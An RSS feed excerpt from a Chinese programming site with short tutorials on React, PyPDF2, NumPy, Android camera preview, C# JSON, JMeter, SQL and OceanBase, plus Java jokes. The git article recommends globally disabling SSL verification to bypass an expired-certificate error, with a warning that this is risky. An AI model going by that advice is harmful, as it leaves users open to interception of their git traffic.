import React, { useState, useEffect } from 'react';  function DataFetcher() {  const [data, setData] = useState(null);  const [query, setQuery] = useState('');  useEffect(() =&gt; {  // 数据获取副作用  fetch(`https://api.example.com/data?query=${query}`)  .then(response =&gt; response.json())  .then(result =&gt; setData(result))  .catch(error =&gt; console.error('Error fetching data:', error));  }, [query]); // 依赖数组包含 query，当 query 变化时重新获取数据  return (  &lt;div&gt;  &lt;input  type="text"  value={query}  onChange={e =&gt; setQuery(e.target.value)}  placeholder="Search..."  /&gt;  {data ? (  &lt;div&gt;  &lt;h1&gt;{data.title}&lt;/h1&gt;  &lt;p&gt;{data.description}&lt;/p&gt;  &lt;/div&gt;  ) : (  &lt;p&gt;Loading...&lt;/p&gt;  )}  &lt;/div&gt;  );  
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540184.html</guid><pubDate>Fri, 31 Oct 2025 07:27:35 +0000</pubDate></item><item><title>【Python 常用脚本及命令系列 7 -- pdf 文件字符搜索 python脚本实现】</title><link>https://www.ppmy.cn/news/1540185.html</link><description>==&gt; 请阅读
【
嵌入式及芯片开发学必备专栏】&lt;==
文章目录
pdf 文件字符搜索 python脚本实现
说明
pdf 文件字符搜索 python脚本实现
要实现一个 Python 脚本来在指定目录中搜索 PDF 文件中的关键字，可以使用
PyPDF2
库来读取 PDF 文本，并结合
os
库来遍历文件系统。以下是一个简单的脚本示例：
import
os
import
PyPDF2
def
search_keyword_in_pdfs
(
directory
,
keyword
)
:
# 遍历指定目录及子目录下的所有文件
for
root
,
_
,
files
in
os
.
walk
(
directory
)
:
for
file
in
files
:
if
file
.
endswith
(
'.pdf'
)
:
file_path
=
os
.
path
.
join
(
root
,
file
)
try
:
# 打开 PDF 文件
with
open
(
file_path
,
'rb'
)
as
pdf_file
:
pdf_reader
=
PyPDF2
.
PdfReader
(
pdf_file
)
# 遍历每一页并搜索关键字
for
page
in
pdf_reader
.
pages
:
text
=
page
.
extract_text
(
)
if
text
and
keyword
.
lower
(
)
in
text
.
lower
(
)
:
print
(
f"Keyword '
{
keyword
}
' found in:
{
file_path
}
"
)
break
# 如果找到关键字，跳出当前文件的搜索
except
Exception
as
e
:
print
(
f"Error reading
{
file_path
}
:
{
e
}
"
)
# 指定目录和关键字
search_directory
=
'd:/work/'
search_keyword
=
'hello'
# 调用搜索函数
search_keyword_in_pdfs
(
search_directory
,
search_keyword
)
说明
导入库
：
os
：用于遍历目录结构。
PyPDF2
：用于处理 PDF 文件。
search_keyword_in_pdfs
函数
：
使用
os.walk()
递归遍历指定目录及其子目录。
过滤出所有扩展名为
.pdf
的文件。
打开每个 PDF 文件，并使用
PyPDF2
读取每一页的文本。
搜索关键字（大小写不敏感），如果找到则打印文件路径。
注意事项
：
确保已安装
PyPDF2
库，可以通过
pip install PyPDF2
安装。
脚本假定目录路径为 Windows 风格，请根据需要调整路径。
PyPDF2
可能对某些复杂的 PDF 格式解析不完全，遇到问题时需要进行错误处理（如上示例中的异常处理）。
请根据具体需要调整脚本，比如处理特殊字符或不同的编码格式。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540185.html</guid><pubDate>Fri, 31 Oct 2025 07:27:38 +0000</pubDate></item><item><title>JAVA地狱级笑话</title><link>https://www.ppmy.cn/news/1540186.html</link><description>为什么Java开发者总是不怕黑暗？
因为他们总是有null指针来照亮路。
Java程序员最讨厌的音乐是什么？
Garbage Collection旋律，节奏总是让他们烦躁。
为什么Java中的HashMap很擅长社交？
因为它总是能快速找到key对应的朋友。
Java开发者和Python开发者吵架，谁赢了？
Java开发者，因为他们有更强的线程管理能力。
为什么Java的方法总是很守时？
因为它们总是按public void方式执行。
Java中的final关键字最怕什么？
被变量改变，因为什么都不允许。
为什么Java程序员喜欢喝咖啡？
因为他们习惯了Java。
Java中的异常为什么总是很挑剔？
因为它们总是要try-catch一下。
什么样的Java代码最擅长隐藏秘密？
private方法，因为外人无法访问。
Java开发者最怕哪种类型的错误？
NullPointerException，因为它们让一切都崩溃。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540186.html</guid><pubDate>Fri, 31 Oct 2025 07:27:40 +0000</pubDate></item><item><title>NumPy 数组操作：从入门到精通</title><link>https://www.ppmy.cn/news/1540187.html</link><description>引言
随着大数据时代的到来，如何高效地存储、处理大量数据成为了一个亟待解决的问题。传统的Python列表虽然灵活，但在面对大规模数据集时显得力不从心。NumPy正是在这种背景下应运而生，它提供了一种高效的数据结构——数组（Array），能够以更低的空间开销存储相同数量的数据，并且支持向量化运算，极大地提升了数据处理速度。无论是进行科学计算、数据分析还是机器学习模型训练，NumPy都是不可或缺的工具之一。
基础语法介绍
数组创建
numpy.array()
: 最常用的数组创建方式，可以将列表或其他序列转换为数组。
numpy.zeros()
,
numpy.ones()
,
numpy.empty()
: 创建特定形状的数组，分别初始化为0、1或未初始化值。
numpy.arange()
,
numpy.linspace()
,
numpy.logspace()
: 生成等差数列、等比数列或对数等比数列。
import
numpy
as
np
# 从列表创建数组
a
=
np
.
array
(
[
1
,
2
,
3
]
)
print
(
a
)
# 输出: [1 2 3]
# 创建零数组
b
=
np
.
zeros
(
(
2
,
3
)
)
print
(
b
)
# 输出:
# [[0. 0. 0.]
#  [0. 0. 0.]]
# 创建等差数列
c
=
np
.
arange
(
1
,
10
,
2
)
print
(
c
)
# 输出: [1 3 5 7 9]
数组索引与切片
单一元素访问：
arr[index]
多维数组索引：
arr[row, column]
切片操作：
arr[start:end:step]
arr
=
np
.
array
(
[
[
1
,
2
,
3
]
,
[
4
,
5
,
6
]
]
)
print
(
arr
[
0
,
1
]
)
# 输出: 2
print
(
arr
[
1
,
:
]
)
# 输出: [4 5 6]
数组运算
算术运算：加(
+
), 减(
-
), 乘(
*
), 除(
/
), 指数(
**
), 取模(
%
)
布尔运算：与(
&amp;
), 或(
|
), 非(
~
)
广播机制：允许不同形状的数组之间进行运算
x
=
np
.
array
(
[
1
,
2
,
3
]
)
y
=
np
.
array
(
[
4
,
5
,
6
]
)
print
(
x
+
y
)
# 输出: [5 7 9]
print
(
x
*
y
)
# 输出: [ 4 10 18]
基础实例
假设我们需要对一个包含温度记录的数组进行处理，将其从摄氏度转换为华氏度。
celsius_temps
=
np
.
array
(
[
-
20
,
-
15
,
0
,
5
,
10
,
15
,
20
]
)
fahrenheit_temps
=
celsius_temps
*
(
9
/
5
)
+
32
print
(
fahrenheit_temps
)
# 输出: [-4.  5. 32. 41. 50. 59. 68.]
进阶实例
接下来，我们尝试使用NumPy处理一个稍微复杂些的问题：给定两个不同长度的数组，如何找到它们之间的交集？
a
=
np
.
array
(
[
1
,
2
,
3
,
4
,
5
]
)
b
=
np
.
array
(
[
4
,
5
,
6
,
7
,
8
]
)
intersect
=
np
.
intersect1d
(
a
,
b
)
print
(
intersect
)
# 输出: [4 5]
此外，NumPy还提供了丰富的函数来处理数组的排序、统计分析等功能，例如
np.sort()
、
np.mean()
、
np.median()
等，可以帮助我们更好地理解数据分布特征。
实战案例
在图像处理领域，NumPy经常被用来读取、编辑图像文件。下面是一个简单的例子，演示如何利用NumPy读取一张图片，并将其转换为灰度图。
from
PIL
import
Image
import
numpy
as
npimg
=
Image
.
open
(
'example.jpg'
)
img_array
=
np
.
array
(
img
)
gray_img_array
=
np
.
dot
(
img_array
[
.
.
.
,
:
3
]
,
[
0.299
,
0.587
,
0.114
]
)
.
astype
(
np
.
uint8
)
gray_img
=
Image
.
fromarray
(
gray_img_array
)
gray_img
.
save
(
'gray_example.jpg'
)
通过上述代码，我们首先使用PIL库打开图片文件，然后将其转换为NumPy数组形式。接着，利用矩阵乘法计算每个像素点的灰度值，并最终保存为新的图像文件。
扩展讨论
除了上述提到的基础知识外，NumPy还有许多高级功能等待着大家去发现，比如随机数生成、线性代数运算、傅里叶变换等。掌握这些技能将使你在处理更复杂数据时游刃有余。同时，NumPy与SciPy、Pandas等其他科学计算库有着紧密的联系，共同构成了Python生态系统中不可或缺的一部分</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540187.html</guid><pubDate>Fri, 31 Oct 2025 07:27:42 +0000</pubDate></item><item><title>基于深度学习的虚拟人类行为模拟</title><link>https://www.ppmy.cn/news/1540188.html</link><description>基于深度学习的虚拟人类行为模拟是指使用深度学习技术来模仿和预测虚拟环境中人类的行为，从而创建逼真的、智能化的虚拟角色。该技术广泛应用于游戏开发、虚拟现实、电影特效、智能交互系统以及自动驾驶仿真等领域。通过捕捉和建模人类行为，虚拟人可以像真人一样与环境和用户互动。
1.
背景
虚拟人类行为模拟的核心在于准确模拟人类行为的动态性和多样性，包括动作、表情、姿态、情感反应等方面。深度学习的出现大大提升了虚拟人的逼真度和智能性，特别是通过大量的训练数据和强大的神经网络架构，可以自动学习复杂的行为模式和场景中的交互。
2.
核心技术
行为数据采集与标注
：为了训练虚拟人类行为模拟系统，首先需要大量的行为数据。常用的数据包括视频、运动捕捉数据（MoCap）、3D扫描数据等。这些数据可以用于提取关键的行为特征，如姿态、运动轨迹、手势等。
深度神经网络（DNN）
：DNN在虚拟行为模拟中的应用十分广泛，特别是用于动作识别、姿态估计和行为预测。通过大规模数据的训练，DNN可以学习到从输入行为数据到输出虚拟行为的映射关系。
生成对抗网络（GAN）
：GAN在虚拟角色的逼真度生成中扮演了重要角色。通过生成器和判别器的对抗训练，GAN能够生成更加逼真、细腻的虚拟人类行为。GAN在虚拟角色的动作合成、表情生成等任务中表现突出。
序列模型（RNN/LSTM/Transformer）
：行为模拟往往具有时间依赖性，因此序列模型被广泛应用于捕捉行为的时序特征。LSTM和GRU等循环神经网络（RNN）擅长处理长期依赖关系，能够在生成复杂连续行为时保持逻辑一致性。近年来，基于Transformer的架构逐渐替代传统RNN，用于更大规模、更复杂行为的模拟。
强化学习（RL）
：在动态环境中，虚拟人需要根据实时反馈调整其行为，这时强化学习显得尤为重要。通过强化学习，虚拟人可以通过与环境的不断交互，学习如何更好地行动，优化自己的行为策略。
模仿学习（Imitation Learning）
：模仿学习通过模仿人类专家的行为进行训练。虚拟人可以通过学习专家的数据，生成类似的动作和行为。该技术在虚拟角色的技能训练和复杂任务执行中应用广泛。
多模态融合
：在虚拟人类行为模拟中，行为不仅仅依赖于姿态和动作，还涉及语音、情感、表情等多个模态。通过多模态融合技术，虚拟人可以同时根据语音指令、情感变化等信息作出相应的行为反应。
3.
行为模拟的关键任务
动作生成与预测
：给定某个场景或任务，预测虚拟人接下来可能采取的动作。这要求模型能够理解当前的环境状态，并生成与场景匹配的行为。例如，在游戏场景中，虚拟角色需要根据玩家的行动进行合适的反应。
姿态估计与姿态生成
：通过深度学习模型估计虚拟人的骨架姿态，特别是在动态动作中，如跳跃、跑步、挥手等复杂行为的实时模拟。
表情与情感模拟
：虚拟角色需要能够根据上下文和交互情况生成合适的表情和情感反应。通过深度学习模型，虚拟角色可以自动生成笑、愤怒、惊讶等丰富的面部表情。
社交行为模拟
：模拟虚拟角色在群体中的交互行为，如队列中的位置调整、多人协作等。通过训练虚拟角色理解社会行为规范，可以使其在复杂的多人场景中作出合理的反应。
语音交互与反应
：语音识别和生成技术与行为模拟相结合，可以让虚拟角色基于语音指令做出动作反应，或者在语音对话时体现出适当的行为表达。
4.
应用场景
游戏开发
：在开放世界或角色扮演游戏中，虚拟角色的行为是关键的体验因素。通过深度学习，游戏中的非玩家角色（NPC）可以展示更加智能的反应和行为，提升游戏的沉浸感。
虚拟现实与增强现实（VR/AR）
：在虚拟现实环境中，虚拟人的行为模拟可以提升用户的沉浸式体验。例如，虚拟教练可以指导用户进行运动训练，虚拟助手可以与用户进行自然的语音和行为互动。
电影与动画
：虚拟角色在电影和动画中使用广泛，深度学习能够大大简化角色的动画制作过程。虚拟角色可以根据剧本自动生成相应的动作和表情，降低了手动动画制作的成本。
自动驾驶仿真
：自动驾驶系统需要在仿真环境中进行测试，而这些环境中的行人和车辆的行为模拟非常重要。通过深度学习，仿真环境中的虚拟行人可以展示出与真实行人相似的行为模式，提高自动驾驶系统的测试效果。
人机交互
：虚拟助手和智能机器人等需要与人类进行自然的交互行为，通过深度学习，虚拟人类可以基于用户的输入作出合适的行为反应，提升人机交互的自然性和智能化水平。
教育与培训
：在虚拟教育和培训场景中，虚拟角色可以充当教学助手，模拟真实场景中的行为，帮助学生和学员进行学习和训练。特别是在医学、军事等领域，虚拟角色的行为模拟对于实际操作训练有重要作用。
5.
未来挑战与发展方向
行为多样性与个性化
：当前的虚拟人类行为模拟在个性化和多样性上还有待提升。未来的模型需要更好地模拟个体差异，生成具有个性特征和行为偏好的虚拟角色。
实时性与高效性
：实时性是虚拟人行为模拟中的关键挑战，特别是在高复杂度的交互场景中，如何高效地生成和预测虚拟人的行为，仍需要进一步优化模型的计算性能。
长期行为规划
：大多数现有的模型在处理短期行为预测上效果较好，但在长期行为规划中表现较为有限。未来的虚拟人类行为模拟系统将需要更加精细的长期行为预测与规划机制。
多模态与多智能体的协作模拟
：虚拟角色不仅需要处理单一行为任务，还要能够与其他虚拟角色和人类用户进行协同行为。例如，在多人游戏或社交平台中，多个智能体的协调与互动是非常重要的，未来的研究将会探索更加复杂的多智能体协作机制。
6.
总结
基于深度学习的虚拟人类行为模拟是虚拟世界中创建逼真、智能的虚拟角色的重要手段。通过神经网络、强化学习、模仿学习等技术，虚拟角色能够展现出丰富的动作、情感和社交行为，广泛应用于游戏、影视、自动驾驶仿真和人机交互等领域。未来的发展将继续推动更加智能化、个性化的虚拟人类行为模拟，进一步提升虚拟角色的真实性和交互体验。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540188.html</guid><pubDate>Fri, 31 Oct 2025 07:27:44 +0000</pubDate></item><item><title>uniapp 实现input聚焦时选中内容(已封装)兼容微信小程序</title><link>https://www.ppmy.cn/news/1540189.html</link><description>老规矩先来看看效果噻！
从上面的录屏中我们可以看出，要实现input自由选中内容的功能是可以实现的，原理其实很简单。
直接运行即可
&lt;template&gt;&lt;view&gt;&lt;!-- &lt;input class="psd"type="digit" :value="inputValue" :focus='focus' selection-start='0' :selection-start='inputValue.length' :selection-end="inputValue.length"bindinput="bindInput" @blur='bindBlur'&gt;&lt;/input&gt;&lt;view class="cover-view" @tap="handleInput"&gt;&lt;/view&gt; --&gt;&lt;view class="pickbox"&gt;&lt;input class="uni-input" type="text" v-model="value" :focus="renameFocus"  :selection-start="start" :selection-end="end" @blur="bindblur"/&gt;&lt;button type="default" @click='pitch'&gt;选中&lt;/button&gt;&lt;/view&gt;&lt;/view&gt;
&lt;/template&gt;&lt;script&gt;export default{data(){return{focus: false,inputValue:9890,value:'选中输入框内容',renameFocus:false,start:-1,end:-1}},methods: {handleInput(e) {// this.setData({this.inputValue= parseFloat(this.inputValue)this.focus= true// })},bindInput(e) {this.setData({inputValue: e.detail.value})this.handleData()},bindBlur() {// this.setData({this.inputValue= this.inputValuethis.focus= falseconsole.log(this.focus)},pitch(){this.renameFocus=truethis.start=0this.end=this.value.toString().length},bindblur(){this.renameFocus= falsethis.start= -1this.end= -1},}}
&lt;/script&gt;&lt;style&gt;.psd {width: 70%;height: 80rpx;border: 1rpx solid #8a8a8a;border-radius: 20rpx;margin: 60% auto 0 auto;font-size: 32rpx;padding-left: 10rpx;}.cover-view {width: 70%;height: 80rpx;border-radius: 20rpx;opacity: 0;position: relative;left: 15%;top: -80rpx;z-index: 10;}&lt;/style&gt;</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540189.html</guid><pubDate>Fri, 31 Oct 2025 07:27:46 +0000</pubDate></item><item><title>Android TextureView实现Camera相机预览、拍照功能</title><link>https://www.ppmy.cn/news/1540190.html</link><description>说明：本文使用的是Camera，不是Camera2，CameraX。
1、首先AndroidManifest添加相机使用权限
&lt;!-- 相机相关 --&gt;&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;&lt;uses-permission android:name="android.permission.CAMERA" /&gt;&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;&lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /&gt;
使用的activity添加硬件加速（默认开启，为啥要开启可自行百度）
android:hardwareAccelerated="true"
2、创建继承于TextureView的类MyTextureView（添贴代码）
package com.nxm.textureviewdemo;import android.content.Context;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.graphics.RectF;
import android.graphics.SurfaceTexture;
import android.graphics.drawable.BitmapDrawable;
import android.hardware.Camera;
import android.os.Build;
import android.os.Environment;
import android.util.AttributeSet;
import android.view.Surface;
import android.view.TextureView;
import android.view.View;
import android.view.WindowManager;import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;/*** *************************************************************************************************** 修改日期                         修改人             任务名称                         功能或Bug描述* 2018/10/12 10:36                 MUZI102                                             TextureView类目* ***************************************************************************************************/
public class MyTextureView extends TextureView implements View.OnLayoutChangeListener {public Camera mCamera;private Context context;private Camera.Parameters param;private boolean isCanTakePicture = false;Matrix matrix;Camera camera;int mWidth = 0;int mHeight = 0;int mDisplayWidth = 0;int mDisplayHeight = 0;int mPreviewWidth = 640;int mPreviewHeight = 480;int orientation = 0;public MyTextureView(Context context, AttributeSet attrs) {super(context, attrs);this.context = context;init();}private void init() {if (null == mCamera) {mCamera = Camera.open();}this.setSurfaceTextureListener(new SurfaceTextureListener() {@Overridepublic void onSurfaceTextureAvailable(SurfaceTexture surfaceTexture, int width, int height) {param = mCamera.getParameters();param.setPictureFormat(PixelFormat.JPEG);param.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);if (!Build.MODEL.equals("KORIDY H30")) {param.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);// 1连续对焦} else {param.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);}mCamera.setParameters(param);//变形处理RectF previewRect = new RectF(0, 0, mWidth, mHeight);double aspect = (double) mPreviewWidth / mPreviewHeight;if (getResources().getConfiguration().orientation== Configuration.ORIENTATION_PORTRAIT) {aspect = 1 / aspect;}if (mWidth &lt; (mHeight * aspect)) {mDisplayWidth = mWidth;mDisplayHeight = (int) (mHeight * aspect + .5);} else {mDisplayWidth = (int) (mWidth / aspect + .5);mDisplayHeight = mHeight;}RectF surfaceDimensions = new RectF(0, 0, mDisplayWidth, mDisplayHeight);Matrix matrix = new Matrix();matrix.setRectToRect(previewRect, surfaceDimensions, Matrix.ScaleToFit.FILL);MyTextureView.this.setTransform(matrix);//&lt;-处理变形int displayRotation = 0;WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);int rotation = windowManager.getDefaultDisplay().getRotation();switch (rotation) {case Surface.ROTATION_0:displayRotation = 0;break;case Surface.ROTATION_90:displayRotation = 90;break;case Surface.ROTATION_180:displayRotation = 180;break;case Surface.ROTATION_270:displayRotation = 270;break;}Camera.CameraInfo info = new Camera.CameraInfo();Camera.getCameraInfo(0, info);int orientation;if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {orientation = (info.orientation - displayRotation + 360) % 360;} else {orientation = (info.orientation + displayRotation) % 360;orientation = (360 - orientation) % 360;}mCamera.setParameters(param);mCamera.setDisplayOrientation(orientation);try {mCamera.setPreviewTexture(surfaceTexture);mCamera.startPreview();isCanTakePicture = true;} catch (Exception e) {e.printStackTrace();}}@Overridepublic void onSurfaceTextureSizeChanged(SurfaceTexture surfaceTexture, int width, int height) {}@Overridepublic boolean onSurfaceTextureDestroyed(SurfaceTexture surfaceTexture) {if (mCamera != null) {mCamera.stopPreview();mCamera.release();mCamera = null;isCanTakePicture = true;}return true;}@Overridepublic void onSurfaceTextureUpdated(SurfaceTexture surfaceTexture) {}});}/*** 拍照*/public void take() {if (mCamera != null &amp;&amp; isCanTakePicture) {isCanTakePicture = false;mCamera.takePicture(new Camera.ShutterCallback() {@Overridepublic void onShutter() {}}, null, mPictureCallback);}}public void startPreview() {if (mCamera != null &amp;&amp; !isCanTakePicture) {MyTextureView.this.setBackgroundDrawable(null);mCamera.startPreview();isCanTakePicture = true;}}public void stopPreview() {if (mCamera != null) {mCamera.stopPreview();}}public void releaseTextureView(){if (mCamera != null) {mCamera.stopPreview();mCamera.release();mCamera = null;isCanTakePicture = true;}}Camera.PictureCallback mPictureCallback = new Camera.PictureCallback() {@Overridepublic void onPictureTaken(byte[] data, Camera camera) {if (mCamera != null) {mCamera.stopPreview();new FileSaver(data).save();}}};@Overridepublic void onLayoutChange(View v, int left, int top, int right, int bottom, int oldLeft, int oldTop, int oldRight, int oldBottom) {mWidth = right - left;mHeight = bottom - top;}private class FileSaver implements Runnable {private byte[] buffer;public FileSaver(byte[] buffer) {this.buffer = buffer;}public void save() {new Thread(this).start();}@Overridepublic void run() {try {File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),System.currentTimeMillis() + ".png");file.createNewFile();FileOutputStream os = new FileOutputStream(file);BufferedOutputStream bos = new BufferedOutputStream(os);Bitmap bitmap = BitmapFactory.decodeByteArray(buffer, 0, buffer.length);bitmap.compress(Bitmap.CompressFormat.PNG, 100, bos);bos.flush();bos.close();os.close();MyTextureView.this.setBackgroundDrawable(new BitmapDrawable(bitmap));} catch (Exception e) {e.printStackTrace();}}}
}
3、acticity中使用
1、xml的布局
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"xmlns:app="http://schemas.android.com/apk/res-auto"xmlns:tools="http://schemas.android.com/tools"android:layout_width="match_parent"android:layout_height="match_parent"tools:context=".MainActivity"&gt;&lt;com.nxm.textureviewdemo.MyTextureViewandroid:id="@+id/mytextureview"android:layout_width="match_parent"android:layout_height="match_parent" /&gt;&lt;Buttonandroid:id="@+id/paizhai"android:layout_width="wrap_content"android:layout_height="wrap_content"android:text="拍照" /&gt;&lt;Buttonandroid:id="@+id/yulan"android:layout_width="wrap_content"android:layout_height="wrap_content"android:layout_toRightOf="@id/paizhai"android:text="预览" /&gt;&lt;/RelativeLayout&gt;
2、使用
package com.nxm.textureviewdemo;import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;public class MainActivity extends AppCompatActivity {private MyTextureView myTextureView;@Overrideprotected void onCreate(Bundle savedInstanceState) {super.onCreate(savedInstanceState);setContentView(R.layout.activity_main);myTextureView = findViewById(R.id.mytextureview);findViewById(R.id.paizhai).setOnClickListener(new View.OnClickListener() {@Overridepublic void onClick(View v) {myTextureView.take();}});findViewById(R.id.yulan).setOnClickListener(new View.OnClickListener() {@Overridepublic void onClick(View v) {myTextureView.startPreview();}});}@Overrideprotected void onStart() {super.onStart();myTextureView.startPreview();}@Overrideprotected void onStop() {myTextureView.stopPreview();super.onStop();}@Overrideprotected void onDestroy() {myTextureView.releaseTextureView();super.onDestroy();}
}
原文TextureView实现相机预览、拍照功能_textureview怎么设置图片-CSDN博客</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540190.html</guid><pubDate>Fri, 31 Oct 2025 07:27:49 +0000</pubDate></item><item><title>C# Json文件写入、读取 ，Json文件序列化、反序列化</title><link>https://www.ppmy.cn/news/1540192.html</link><description>在C#中，处理JSON文件的写入、读取、序列化和反序列化是一个常见的需求，特别是在需要与前端JavaScript应用进行数据交换或配置文件管理的场景中。下面将分别介绍如何使用.NET自带的
System.Text.Json
命名空间（从.NET Core 3.0开始引入）和广泛使用的第三方库
Newtonsoft.Json
（也称为Json.NET）来完成这些任务。
使用
System.Text.Json
序列化
序列化是将对象转换为JSON字符串的过程。
using
System
;
using
System
.
Text
.
Json
;
public
class
Person
{
public
string
Name
{
get
;
set
;
}
public
int
Age
{
get
;
set
;
}
}
class
Program
{
static
void
Main
(
string
[
]
args
)
{
Person
person
=
new
Person
{
Name
=
"John Doe"
,
Age
=
30
}
;
string
jsonString
=
JsonSerializer
.
Serialize
(
person
)
;
Console
.
WriteLine
(
jsonString
)
;
// 写入到文件
using
(
var
writer
=
System
.
IO
.
File
.
CreateText
(
"person.json"
)
)
{
writer
.
Write
(
jsonString
)
;
}
}
}
反序列化
反序列化是将JSON字符串转换回对象的过程。
using
System
;
using
System
.
Text
.
Json
;
using
System
.
IO
;
class
Program
{
static
void
Main
(
string
[
]
args
)
{
string
jsonString
=
File
.
ReadAllText
(
"person.json"
)
;
Person
person
=
JsonSerializer
.
Deserialize
&lt;
Person
&gt;
(
jsonString
)
;
Console
.
WriteLine
(
$"Name:
{
person
.
Name
}
, Age:
{
person
.
Age
}
"
)
;
}
}
使用
Newtonsoft.Json
(Json.NET)
序列化
using
Newtonsoft
.
Json
;
using
System
;
public
class
Person
{
public
string
Name
{
get
;
set
;
}
public
int
Age
{
get
;
set
;
}
}
class
Program
{
static
void
Main
(
string
[
]
args
)
{
Person
person
=
new
Person
{
Name
=
"John Doe"
,
Age
=
30
}
;
string
jsonString
=
JsonConvert
.
SerializeObject
(
person
)
;
Console
.
WriteLine
(
jsonString
)
;
// 写入到文件
System
.
IO
.
File
.
WriteAllText
(
"person.json"
,
jsonString
)
;
}
}
反序列化
using
Newtonsoft
.
Json
;
using
System
;
using
System
.
IO
;
class
Program
{
static
void
Main
(
string
[
]
args
)
{
string
jsonString
=
File
.
ReadAllText
(
"person.json"
)
;
Person
person
=
JsonConvert
.
DeserializeObject
&lt;
Person
&gt;
(
jsonString
)
;
Console
.
WriteLine
(
$"Name:
{
person
.
Name
}
, Age:
{
person
.
Age
}
"
)
;
}
}
注意事项
选择库
：
System.Text.Json
是.NET Core 3.0及更高版本的一部分，对于新项目，如果不需要Json.NET的高级功能，推荐使用它，因为它有更好的性能和更少的内存占用。
异常处理
：在实际应用中，我们可能需要添加异常处理逻辑来捕获并处理在序列化/反序列化过程中可能发生的错误，例如文件访问错误或JSON格式错误。
性能
：在处理大量数据或需要高性能的场景中，应测试并比较不同库的性能。
版本兼容性
：在使用第三方库时，注意库的版本与项目依赖之间的兼容性。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540192.html</guid><pubDate>Fri, 31 Oct 2025 07:27:52 +0000</pubDate></item><item><title>关于jmeter设置为中文问题之后无法保存设置的若干问题</title><link>https://www.ppmy.cn/news/1540193.html</link><description>1、jemeter如何设置中文模式
Options---&gt;Choose Language---&gt;Chinese(Simplifies),
如此设置后就可显示中文模式(缺点：下次打开还是英文)；如下图所示：
操作完成之后：
但是下次重启之后依旧是英文；
2、在jmeter.properties修改语言默认配置：
打开该文件，找到如下所示#language=En，将其修改为language=zh_CN
保存该文件，并重新启动jmeter；
结果如下所示：
ps：本次的问题就结束了，谢谢观看；
本文封面是gnz48中n3的太上皇刘力菲！！！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540193.html</guid><pubDate>Fri, 31 Oct 2025 07:27:54 +0000</pubDate></item><item><title>git 报错 SSL certificate problem: certificate has expired</title><link>https://www.ppmy.cn/news/1540194.html</link><description>git小乌龟 报错 SSL certificate problem: certificate has expired
场景复现：
原因：
这个错误表明你在使用Git时尝试通过HTTPS进行通信，但是SSL证书已经过期。这通常发生在使用自签名证书或证书有效期已到期的情况下。
解决方法:
1.如果是自己生成的证书，需要更新或替换证书，确保新证书的有效期内包含当前日期。
2.如果是第三方的证书，可能需要联系证书提供商更新证书。
3.临时解决方法是在Git命令中添加参数来忽略证书验证(不推荐，因为会有安全风险
临时解决方案：
打开git bash输入代码回车就可以了
git config --global http.sslVerify false
临时的不建议使用，必要时刻使用完了之后再执行一次改成true改回去</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540194.html</guid><pubDate>Fri, 31 Oct 2025 07:27:57 +0000</pubDate></item><item><title>ISNULL 和 COALESCE 区别</title><link>https://www.ppmy.cn/news/1540195.html</link><description>ISNULL
数据库支持：ISNULL 是 SQL Server 特有的函数。
参数数量：ISNULL 接受两个参数。第一个参数是要检查是否为 NULL 的表达式，第二个参数是当第一个参数为 NULL 时要返回的值。
类型转换：如果 ISNULL 的两个参数数据类型不同，SQL Server 会尝试将第二个参数隐式转换为第一个参数的数据类型。如果无法进行隐式转换，则需要显式地转换数据类型。
语法：
Sql
ISNULL(check_expression, replacement_value)
COALESCE
数据库支持：COALESCE 是标准的 SQL 函数，被大多数关系型数据库支持，包括 SQL Server、MySQL、PostgreSQL 等。
参数数量：COALESCE 可以接受两个或更多的参数。它从左到右评估每个表达式，并返回第一个非 NULL 的表达式的值。如果所有表达式都为 NULL，则返回 NULL。
类型转换：COALESCE 返回的是与第一个非 NULL 参数相同的数据类型。如果所有参数都是不同的类型，那么结果类型将是根据数据库特定规则确定的最通用类型。
语法：
Sql
COALESCE(expr1, expr2, …, exprN)</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540195.html</guid><pubDate>Fri, 31 Oct 2025 07:28:00 +0000</pubDate></item><item><title>如何在OceanBase中新增系统变量及应用实践</title><link>https://www.ppmy.cn/news/1540197.html</link><description>因为系统变量涉及复杂的工程文件，为防止新增变量操作对软件系统的潜在影响，OceanBase为多数开发者设计了一套高效的编程框架。此框架允许开发者在新增及使用系统变量时，仅需专注于变量定义的细节。具体来说，通过运行一个Python脚本，开发者可以自动化地生成新增系统变量所需的代码，极大地简化了操作过程。
本文以一个案例，说明如何在OceanBase中新增一个系统变量，以及如何进行应用。
系统变量（variables）
生效范围：global（租户隔离）/session（会话级隔离）
案例：
ob_query_timeout 用于设置对SQL语句进行DML操作的超时时间，单位是微秒。
系统变量的生成
如何去为OB新增一个系统变量
需要注意的点
1.修改/src/share/system_variables/ob_system_variable_init.json，并执行/src/share/system_variables/gen_ob_sys_variables.py即可。 下图就是ob_system_variable_init.json中的一个变量对应json对象。
2.系统变量的id应该保证单调递增3.无法废弃系统变量 (只增不删)4.修改ob_system_variable_init.json文件，哪怕是改了info，实际都等价于修改了upgrade_pre.py，是需要推版本号的。
